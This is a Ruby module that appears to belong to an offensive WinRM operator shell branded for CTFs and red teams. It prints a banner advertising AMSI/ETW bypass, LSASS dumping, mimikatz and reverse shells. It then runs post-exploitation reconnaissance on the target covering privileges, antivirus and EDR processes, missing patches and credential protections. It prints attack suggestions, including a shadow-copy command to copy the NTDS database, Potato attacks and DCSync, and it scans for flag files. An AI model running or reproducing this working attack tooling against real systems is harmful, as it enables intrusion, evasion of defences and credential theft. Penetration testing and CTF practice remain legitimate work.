module EvilCTF::Banner
  def self.show_banner_with_flagscan(shell, options)
    puts <<~BANNER

     █████╗ ██╗    ██╗██╗███╗   ██╗██████╗ ███╗   ███╗
    ██╔══██╗██║    ██║██║████╗  ██║██╔══██╗████╗ ████║
    ███████║██║ █╗ ██║██║██╔██╗ ██║██████╔╝██╔████╔██║
    ██╔══██║██║███╗██║██║██║╚██╗██║██╔══██╗██║╚██╔╝██║
    ██║  ██║╚███╔███╔╝██║██║ ╚████║██║  ██║██║ ╚═╝ ██║
    ╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝

                    AWINRM OPERATOR SHELL

    CTF Edition v2025 — For Red Teamers, Pentesters & Flag Hunters
    🔹 Try `enum deep` for full recon, `dump_creds` for live creds
    🔹 Use `lsass_dump` for memory, `tool all` to stage everything
    🔹 AMSI & Defender? Use `bypass-4msi` to go stealth
    🔹 Need a shell on target? `!bash` or `invoke-binary` is your friend
    🔹 Domain intel quick? Run `dom_enum` or `powerview all`
    🔹 Kerberoast tickets: `kerberoast` for SPN attacks
    🔹 AD mapping: `tool sharphound` then `sharphound -c all`
    🔹 Harvest creds: `cred_harvest` or `tool mimikatz`
    🔹 Relay attacks: `tool inveigh` and `inveigh start`
    🔹 Rev shells: `tool nishang` for PowerShell payloads
    🔹 Sys internals: `tool seatbelt` with `seatbelt -group=all`
    🔹 Priv esc scans: `tool winpeas` for vuln checks
    🔹 Ticket ops: `tool rubeus` like `rubeus klist`
    🔹 ETW evade: `bypass-etw` for advanced logging bypass
    🔹 File upload stealth: `upload -x /local/path remote/path`
    🔹 Download artifacts: `download C:\\path loot/`
    🔹 SOCKS pivot: `socks_init` for proxy chaining
    🔹 Loot overview: `loot show` for extracted items
    🔹 Menu help: `menu` for module list, `help` for commands

    BANNER

    puts "\n" + '=' * 70
    puts 'AWINRM CTF SESSION'.center(70)
    puts '=' * 70

    # Basic System Information
    hostname = shell.run('hostname').output.strip
    os_version = shell.run('systeminfo | findstr /B /C:"OS Name" /C:"OS Version"').output.strip
    arch = shell.run('$env:PROCESSOR_ARCHITECTURE').output.strip

    puts "\nSystem Information:"
    puts "  Hostname        : #{hostname}"
    puts "  OS Version      : #{os_version}"
    puts "  Architecture    : #{arch}"

    # Core System Information
    puts "\n" + "CORE SYSTEM INFORMATION".center(70, '-')
    core_info = {
      'Domain'                  => '(Get-WmiObject Win32_ComputerSystem).Domain',
      'Domain Joined'           => '(Get-WmiObject Win32_ComputerSystem).PartOfDomain',
      'Current User'            => '[Security.Principal.WindowsIdentity]::GetCurrent().Name',
      'Integrity Level'         => 'whoami /groups | findstr "Mandatory Label"',
      'PS Language Mode'        => '$ExecutionContext.SessionState.LanguageMode',
      'PowerShell Version'      => '$PSVersionTable.PSVersion.ToString()',
      'Defender Enabled'        => '(Get-MpComputerStatus).RealTimeProtectionEnabled',
      'AV Signatures Outdated'  => '(Get-MpComputerStatus).AntivirusSignatureAge',
      'Installed AVs'           => 'Get-CimInstance -Namespace "root/SecurityCenter2" -ClassName AntivirusProduct | Select-Object -ExpandProperty displayName',
      'Firewall Status'         => 'netsh advfirewall show allprofiles | findstr "State"',
      'UAC Level'               => 'Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" | Select-Object -ExpandProperty ConsentPromptBehaviorAdmin',
      'Is Local Admin'          => 'net localgroup Administrators | findstr /i "$env:USERNAME"',
      'Sessions'                => 'query user',
      'Remote Time (UTC)'       => '[datetime]::UtcNow.ToString("yyyy-MM-dd HH:mm:ss")',
      'Boot Time'               => '(Get-CimInstance Win32_OperatingSystem).LastBootUpTime.ToString("yyyy-MM-dd HH:mm:ss")'
    }
    
    core_info.each do |label, cmd|
      begin
        output = shell.run(cmd).output.strip
        output = output.lines.take(2).join(' | ').strip if output.lines.count > 2
        output = 'N/A' if output.empty?
        puts "  #{label.ljust(30)} : #{output}"
      rescue => e
        puts "  #{label.ljust(30)} : Error: #{e.message}"
      end
    end

    # Privilege & Token Information
    puts "\n" + "PRIVILEGE & TOKEN INFORMATION".center(70, '-')
    privilege_cmds = {
      'SeDebugPrivilege'        => 'whoami /priv | findstr "SeDebugPrivilege"',
      'SeImpersonatePrivilege'  => 'whoami /priv | findstr "SeImpersonatePrivilege"',
      'SeAssignPrimaryPrivilege'=> 'whoami /priv | findstr "SeAssignPrimaryPrivilege"',
      'Token Privileges Count'  => '(whoami /priv | Measure-Object -Line).Lines - 1'
    }
    
    privilege_cmds.each do |label, cmd|
      begin
        output = shell.run(cmd).output.strip
        output = output.lines.first.strip if output.include?("Enabled") || output.include?("Disabled")
        output = 'Not Found' if output.empty?
        puts "  #{label.ljust(30)} : #{output}"
      rescue => e
        puts "  #{label.ljust(30)} : Error: #{e.message}"
      end
    end

    # Performance & Health - FIXED System Uptime command
    puts "\n" + "PERFORMANCE & HEALTH".center(70, '-')
    perf_cmds = {
      "System Uptime" => '((Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime).ToString("dd\\.hh\\:mm\\:ss")',
      "CPU Usage %" => '(Get-CimInstance Win32_Processor | Measure-Object -Property LoadPercentage -Average).Average',
      "Memory Usage (MB)" => '[math]::Round((Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize / 1024)',
      "Free Memory (MB)" => '[math]::Round((Get-CimInstance Win32_OperatingSystem).FreePhysicalMemory / 1024)',
      "Disk Drives" => '(Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -ne $null} | ForEach-Object { "$($_.Name): $([math]::Round($_.Free / 1GB, 2))GB free" }) -join "; "'
    }
    
    perf_cmds.each do |label, cmd|
      begin
        output = shell.run(cmd).output.strip
        puts "  #{label.ljust(25)} : #{output.empty? ? 'N/A' : output}"
      rescue => e
        puts "  #{label.ljust(25)} : Error: #{e.message}"
      end
    end

    # Enhanced MSSQL Detection
    puts "\n" + "MSSQL DETECTION".center(70, '-')
    begin
      sql_ver_check = shell.run("sqlcmd -Q \"SELECT @@version\"").output.strip
      if sql_ver_check.include?("Microsoft SQL Server")
        puts "  [*] MSSQL Instance Detected"
        sql_queries = {
          "SQL Version"       => "sqlcmd -Q \"SELECT @@version\"",
          "SQL Current User"  => "sqlcmd -Q \"SELECT SYSTEM_USER, USER_NAME()\"",
          "SQL Available DBs" => "sqlcmd -Q \"SELECT name FROM sys.databases\"",
          "SQL Linked Servers"=> "sqlcmd -Q \"EXEC sp_linkedservers\""
        }
        
        sql_queries.each do |label, cmd|
          output = shell.run(cmd).output.strip
          output = output.lines.take(2).join(" | ").strip
          puts "  #{label.ljust(25)} : #{output.empty? ? 'N/A' : output}"
        end
        
        # Additional SQL checks
        sql_checks = {
          "SQL xp_cmdshell" => "sqlcmd -Q \"EXEC sp_configure 'xp_cmdshell';\"",
          "SQL CLR Enabled" => "sqlcmd -Q \"EXEC sp_configure 'clr enabled';\""
        }
        
        sql_checks.each do |check, cmd|
          output = shell.run(cmd).output.strip
          if output.include?("1")
            puts "  [!] #{check} : ENABLED"
          else
            puts "  [ ] #{check} : disabled"
          end
        end
      else
        puts "  [ ] No MSSQL Instance Detected"
      end
    rescue => e
      puts "  [ ] MSSQL Detection Error: #{e.message}"
    end

    # Enhanced Patch Information - Cleaned up version
    puts "\n" + "PATCH & VULNERABILITY STATUS".center(70, '-')
    begin
      # Get all hotfixes for comprehensive checking
      all_hotfixes = shell.run("Get-HotFix | Select-Object HotFixID").output
      
      # Focus on critical, well-known vulnerabilities with reliable KB detection
      critical_patches = {
        "MS17-010 (EternalBlue)" => ["KB4012212", "KB4012215", "KB4012216", "KB4012217", "KB4012218", "KB4012219", "KB4012220", "KB4012598", "KB4012606", "KB4013198", "KB4013389", "KB4013429"],
        "MS08-067 (Conficker)" => ["KB958644"],
        "MS14-068 (Kerberos)" => ["KB3011780"]
      }
      
      critical_patches.each do |desc, kb_list|
        patched = kb_list.any? { |kb| all_hotfixes.include?(kb) }
        status = patched ? "PATCHED" : "MISSING"
        symbol = patched ? "[+]" : "[!]"
        puts "  #{symbol} #{desc} - #{status}"
      end
      
      # Get last patch info
      last_patch = shell.run('Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 1 | Format-Table HotFixID,InstalledOn -AutoSize').output.strip
      patch_count = shell.run('(Get-HotFix | Measure-Object).Count').output.strip
      
      puts "\n  Patch Summary:"
      puts "    Total Hotfixes: #{patch_count}"
      if last_patch && !last_patch.empty?
        puts "    Last Patch: #{last_patch.lines.last.strip}" if last_patch.lines.count > 1
      end
      
    rescue => e
      puts "  [ ] Patch info error: #{e.message}"
    end

    # Security Hardening Checks
    puts "\n" + "SECURITY HARDENING CHECKS".center(70, '-')
    security_cmds = {
      'LSA Protection'          => '(Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue).RunAsPPL',
      'Credential Guard'        => '(Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\\Microsoft\\Windows\\DeviceGuard -ErrorAction SilentlyContinue).SecurityServicesRunning',
      'BitLocker Status'        => '(Manage-BDE -Status C: 2>$null | findstr "Conversion Status") -split ": " | Select-Object -Last 1',
      'SMB Signing'             => '(Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters" -Name "RequireSecuritySignature" -ErrorAction SilentlyContinue).RequireSecuritySignature',
      'Wdigest Enabled'         => 'Get-ItemProperty -Path "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest" -Name UseLogonCredential -ErrorAction SilentlyContinue',
      'LSASS Protection'        => '(Get-Process -Name lsass -ErrorAction SilentlyContinue).Protection'
    }
    
    security_cmds.each do |label, cmd|
      begin
        output = shell.run(cmd).output.strip
        output = "Not Enabled" if output.empty? || output == "N/A"
        puts "  #{label.ljust(30)} : #{output}"
      rescue => e
        puts "  #{label.ljust(30)} : Error: #{e.message}"
      end
    end

    # Application & Service Detection
    puts "\n" + "APPLICATION & SERVICE DETECTION".center(70, '-')
    app_cmds = {
      'IIS Installed'           => 'Get-WindowsFeature -Name Web-Server | Select-Object -ExpandProperty InstallState',
      'SQL Server Instances'    => '(Get-Service -Name "MSSQL*" | Select-Object -ExpandProperty Name) -join ", "',
      'Exchange Installed'      => 'Get-Service -Name "MSExchange*" | Select-Object -ExpandProperty Name',
      'AV/EDR Processes'        => '(Get-Process | Where-Object {$_.ProcessName -match "csfalcon|crowd|sentinel|defender|sophos|mcafee|symantec|carbon"} | Select-Object -ExpandProperty ProcessName) -join ", "'
    }
    
    app_cmds.each do |label, cmd|
      begin
        output = shell.run(cmd).output.strip
        output = "Not Detected" if output.empty? || output == "N/A"
        puts "  #{label.ljust(30)} : #{output}"
      rescue => e
        puts "  #{label.ljust(30)} : Error: #{e.message}"
      end
    end

    # Network & Connectivity
    puts "\n" + "NETWORK & CONNECTIVITY".center(70, '-')
    network_cmds = {
      'DNS Servers'             => '(Get-DnsClientServerAddress -AddressFamily IPv4 | Select-Object -ExpandProperty ServerAddresses) -join ", "',
      'Network Profiles'        => '(Get-NetConnectionProfile | Select-Object -ExpandProperty Name) -join ", "',
      'Listening Ports Count'   => '(Get-NetTCPConnection -State Listen | Measure-Object).Count',
      'Established Connections' => '(Get-NetTCPConnection -State Established | Measure-Object).Count',
      'Local IP Addresses'      => '(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.IPAddress -ne "127.0.0.1"} | Select-Object -ExpandProperty IPAddress) -join ", "'
    }
    
    network_cmds.each do |label, cmd|
      begin
        output = shell.run(cmd).output.strip
        puts "  #{label.ljust(30)} : #{output.empty? ? 'N/A' : output}"
      rescue => e
        puts "  #{label.ljust(30)} : Error: #{e.message}"
      end
    end

    # NEW: RISK ASSESSMENT & AUTO-SUGGESTIONS
    risk_data = assess_risk(shell)
    display_risk_assessment(risk_data)
    display_auto_suggestions(risk_data)
    display_attack_paths(risk_data)
    display_lateral_movement_opportunities(shell)

    # NEW: BACKUP & SHADOW COPIES
    puts "\n" + "BACKUP & SHADOW COPIES".center(70, '-')
    begin
      shadow_copies = shell.run('vssadmin list shadows 2>$null').output.strip
      if shadow_copies.include?('Shadow Copy Volume')
        count = shadow_copies.scan('Shadow Copy Volume').count
        puts "  [+] Shadow Copies Available: #{count} found"
        puts "  [!] Use: `vssadmin create shadow /For=C:` to create new"
        puts "  [!] Use: `copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit .` for NTDS"
      else
        puts "  [ ] No Shadow Copies Detected"
      end
    rescue => e
      puts "  [ ] Shadow Copy Check Failed: #{e.message}"
    end

    # NEW: GROUP POLICY OVERVIEW
    puts "\n" + "GROUP POLICY SETTINGS".center(70, '-')
    begin
      gpo = shell.run('gpresult /Z | findstr /C:"Group Policy was applied" 2>$null').output.strip
      if gpo.include?('applied')
        puts "  [+] Group Policy Applied: Yes"
        puts "  [i] Run: `gpresult /H gpo.html` to export detailed report"
      else
        puts "  [ ] Group Policy: Not applied or limited"
      end
    rescue => e
      puts "  [ ] GPO Check Failed: #{e.message}"
    end

    # NEW: TRUST RELATIONSHIPS (if domain joined)
    domain_check = shell.run('(Get-WmiObject Win32_ComputerSystem).PartOfDomain').output.strip
    if domain_check == "True"
      puts "\n" + "TRUST RELATIONSHIPS".center(70, '-')
      begin
        trusts = shell.run('nltest /domain_trusts /all_trusts 2>$null').output.strip
        if trusts.include?('Domain Trusts')
          puts "  [+] Domain Trusts Found"
          trusts.split("\n").each do |line|
            puts "      #{line}" if line.include?('Trusted domain:') || line.include?('Trust attributes:')
          end
        else
          puts "  [ ] No Domain Trusts Detected"
        end
      rescue => e
        puts "  [ ] Trust Relationship Check Failed: #{e.message}"
      end
    end

    # NEW: DEFAULT ACCOUNT CHECKS
    puts "\n" + "DEFAULT ACCOUNT CHECKS".center(70, '-')
    begin
      default_accounts = {
        'Administrator' => 'Built-in admin',
        'Guest' => 'Built-in guest',
        'DefaultAccount' => 'Windows 10 default'
      }
      
      default_accounts.each do |acc, desc|
        status = shell.run("net user #{acc} 2>$null").output.strip
        if status.include?('Account active') && status.include?('Yes')
          puts "  [!] #{acc} (#{desc}): ENABLED"
        else
          puts "  [+] #{acc} (#{desc}): Disabled"
        end
      end
    rescue => e
      puts "  [ ] Default Account Check Failed: #{e.message}"
    end

    # NEW: UNQUOTED SERVICE PATHS
    puts "\n" + "UNQUOTED SERVICE PATHS".center(70, '-')
    begin
      services_ps = <<~POWERSHELL
        Get-WmiObject -Class Win32_Service | Where-Object {
          $_.PathName -notlike '"*' -and $_.PathName -like '*.exe*'
        } | Select-Object Name, DisplayName, PathName, State | Format-Table -AutoSize
      POWERSHELL
      
      services_output = shell.run(services_ps).output.strip
      if services_output.lines.count > 3
        puts "  [!] Unquoted Service Paths Found:"
        services_output.lines[3..6].each do |line|
          puts "      #{line.strip}" if line.strip.length > 0
        end
        puts "      ... (run 'get-unquotedservices' for full list)"
      else
        puts "  [+] No Unquoted Service Paths Detected"
      end
    rescue => e
      puts "  [ ] Unquoted Service Path Check Failed: #{e.message}"
    end

    # Connection Information
    puts "\n" + "CONNECTION INFORMATION".center(70, '-')
    connection_info = {
      'Transport'               => "'#{options[:ssl] ? 'HTTPS' : 'HTTP'}'",
      'Port'                    => "'#{options[:port]}'",
      'SSL'                     => "'#{options[:ssl] ? 'Yes' : 'No'}'",
      'Auth Type'               => "'#{options[:hash] ? 'NTLM Hash' : 'Password'}'",
      'Endpoint'                => "'#{options[:endpoint] || 'N/A'}'",
      'Stealth Mode'            => "'#{options[:stealth] ? 'Yes' : 'No'}'",
      'Auto Evasion'            => "'#{options[:auto_evasion] ? 'Yes' : 'No'}'",
      'Loot Items'              => "'#{Dir.glob('loot/**/*').select { |f| File.file?(f) }.count} files'"
    }
    connection_info.each do |label, value|
      puts "  #{label.ljust(30)} : #{eval(value)}"
    end

    # ---------- Flag Scan ----------
    puts "\n" + "FLAG SCAN".center(70, '-')
    ps = <<~POWERSHELL
      $users = Get-ChildItem C:\\Users -ErrorAction SilentlyContinue | Where-Object { $_.PSIsContainer }
      $paths = @()
      foreach ($u in $users) {
        $paths += "$($u.FullName)\\Desktop\\flag.txt"
        $paths += "$($u.FullName)\\Documents\\flag.txt"
        $paths += "$($u.FullName)\\Downloads\\flag.txt"
        $paths += "$($u.FullName)\\user.txt"
        $paths += "$($u.FullName)\\root.txt"
      }
      $paths += "C:\\flag.txt", "C:\\user.txt", "C:\\root.txt", "C:\\Windows\\System32\\config\\flag.txt"
      foreach ($f in $paths) {
        if (Test-Path $f) {
          $c = Get-Content $f -Raw -ErrorAction SilentlyContinue
          if ($c) {
            Write-Output "FLAGFOUND|||$f|||$c"
          }
        }
      }
    POWERSHELL

    begin
      result = shell.run(ps)
      flags_found = false
      result.output.each_line do |line|
        next unless line.include?("FLAGFOUND|||")
        flags_found = true
        path, value = line.strip.split("|||", 3)[1..2]
        puts "  [!] Found flag: #{path}"
        puts "      #{value.strip}"
      end
      puts "  [+] No flags found in common locations" unless flags_found
    rescue => e
      puts "  [ ] Flag scan failed: #{e.message}"
    end

    puts "\n" + '=' * 70
    puts "SESSION READY - Type 'help' for commands or 'menu' for modules"
    puts '=' * 70
  end

  # RISK ASSESSMENT METHOD
  def self.assess_risk(shell)
    risk_score = 0
    findings = []
    suggestions = []
    
    # Check privileges
    priv_check = shell.run('whoami /priv').output
    if priv_check.include?('SeDebugPrivilege')
      risk_score += 30
      findings << "SeDebugPrivilege enabled - LSASS access possible"
      suggestions << "Use mimikatz or dump LSASS memory"
    end
    
    if priv_check.include?('SeImpersonatePrivilege')
      risk_score += 20
      findings << "SeImpersonatePrivilege enabled - Potato attack possible"
      suggestions << "Try various Potato attacks (Juicy, Rogue, etc.)"
    end
    
    # Check if local admin
    admin_check = shell.run('net localgroup Administrators | findstr /i "$env:USERNAME"').output
    if admin_check.include?('Administrators')
      risk_score += 25
      findings << "Local Administrator privileges"
      suggestions << "Dump credentials, check for lateral movement"
    end
    
    # Check Defender status
    defender_check = shell.run('(Get-MpComputerStatus).RealTimeProtectionEnabled').output.strip
    if defender_check == "False"
      risk_score += 15
      findings << "Windows Defender real-time protection disabled"
      suggestions << "Easier to run tools and payloads"
    end
    
    # Check UAC level
    uac_check = shell.run('Get-ItemProperty "HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" | Select-Object -ExpandProperty ConsentPromptBehaviorAdmin').output.strip
    if uac_check == "0"
      risk_score += 10
      findings << "UAC disabled - no elevation prompts"
      suggestions << "Direct privilege escalation possible"
    end
    
    # Check domain joined
    domain_check = shell.run('(Get-WmiObject Win32_ComputerSystem).PartOfDomain').output.strip
    if domain_check == "True"
      risk_score += 20
      findings << "Domain joined - AD attack surface available"
      suggestions << "Enumerate domain, check for Kerberoastable accounts"
    end
    
    # Check RDP
    rdp_check = shell.run('(Get-ItemProperty "HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server" -Name "fDenyTSConnections").fDenyTSConnections').output.strip
    if rdp_check == "0"
      risk_score += 5
      findings << "RDP enabled - lateral movement possible"
      suggestions << "Check for RDP sessions or try RDP hijacking"
    end
    
    {score: risk_score, findings: findings, suggestions: suggestions}
  end

  # AUTO-SUGGESTIONS METHOD
  def self.display_auto_suggestions(risk_data)
    puts "\n" + "AUTO-SUGGESTIONS".center(70, '-')
    if risk_data[:score] >= 50
      puts "  [HIGH] PRIVILEGE ENVIRONMENT DETECTED"
      puts "      → Run: 'dump_creds' for immediate credential harvesting"
      puts "      → Run: 'lsass_dump' for memory credential extraction"
      puts "      → Run: 'dom_enum' for domain enumeration"
    elsif risk_data[:score] >= 25
      puts "  [MEDIUM] PRIVILEGE ENVIRONMENT"
      puts "      → Run: 'enum basic' for system enumeration"
      puts "      → Run: 'priv_esc_check' for privilege escalation vectors"
      puts "      → Run: 'kerberoast' for service account attacks"
    else
      puts "  [LOW] PRIVILEGE ENVIRONMENT"
      puts "      → Run: 'enum deep' for comprehensive recon"
      puts "      → Run: 'file_search' for sensitive files"
      puts "      → Run: 'cred_harvest' for credential hunting"
    end
    
    risk_data[:suggestions].each_with_index do |suggestion, index|
      puts "      → #{suggestion}" if index < 3
    end
  end

  # RISK ASSESSMENT DISPLAY
  def self.display_risk_assessment(risk_data)
    puts "\n" + "RISK ASSESSMENT".center(70, '-')
    if risk_data[:score] >= 70
      puts "  [CRITICAL] RISK: #{risk_data[:score]}/100"
      puts "      High privilege environment with multiple attack vectors"
    elsif risk_data[:score] >= 40
      puts "  [MEDIUM] RISK: #{risk_data[:score]}/100"
      puts "      Moderate privileges with some attack vectors"
    else
      puts "  [LOW] RISK: #{risk_data[:score]}/100"
      puts "      Limited privileges - focus on enumeration and discovery"
    end
    
    puts "\n  KEY FINDINGS:"
    risk_data[:findings].each do |finding|
      puts "    • #{finding}"
    end
  end

  # ATTACK PATHS DETECTION
  def self.display_attack_paths(risk_data)
    puts "\n" + "COMMON ATTACK PATHS".center(70, '-')
    
    if risk_data[:findings].any? { |f| f.include?('SeImpersonatePrivilege') }
      puts "  [→] Potato Family Attacks:"
      puts "      JuicyPotato, RoguePotato, PrintSpoofer"
    end
    
    if risk_data[:findings].any? { |f| f.include?('Local Administrator') }
      puts "  [→] Credential Attacks:"
      puts "      Dump SAM/LSA secrets, check unattend.xml"
    end
    
    if risk_data[:findings].any? { |f| f.include?('Domain joined') }
      puts "  [→] Active Directory Attacks:"
      puts "      Kerberoasting, AS-REP Roasting, DCSync"
    end
    
    puts "  [→] Always: Check for unquoted service paths"
    puts "  [→] Always: Check for writable service binaries"
    puts "  [→] Always: Check for stored credentials"
  end

  # LATERAL MOVEMENT OPPORTUNITIES
  def self.display_lateral_movement_opportunities(shell)
    puts "\n" + "LATERAL MOVEMENT OPPORTUNITIES".center(70, '-')
    
    # Check for network shares
    shares = shell.run('net share 2>$null').output
    if shares.include?('ADMIN$') || shares.include?('C$')
      puts "  [→] Admin Shares: Available (ADMIN$, C$)"
    end
    
    # Check SMB signing
    smb_signing = shell.run('(Get-SmbServerConfiguration | Select-Object -ExpandProperty EnableSecuritySignature) 2>$null').output.strip
    if smb_signing == "False"
      puts "  [→] SMB Signing: Disabled (SMB relay possible)"
    end
    
    # Check for PS remoting
    ps_remoting = shell.run('Get-PSSessionConfiguration 2>$null').output
    if ps_remoting.include?('Microsoft.PowerShell')
      puts "  [→] PS Remoting: Enabled"
    end
    
    # Check for WinRM
    winrm = shell.run('Get-Service WinRM 2>$null').output
    if winrm.include?('Running')
      puts "  [→] WinRM: Running (lateral movement possible)"
    end
    
    puts "  [→] Always: Check for reused passwords"
    puts "  [→] Always: Check for token impersonation"
  end
end
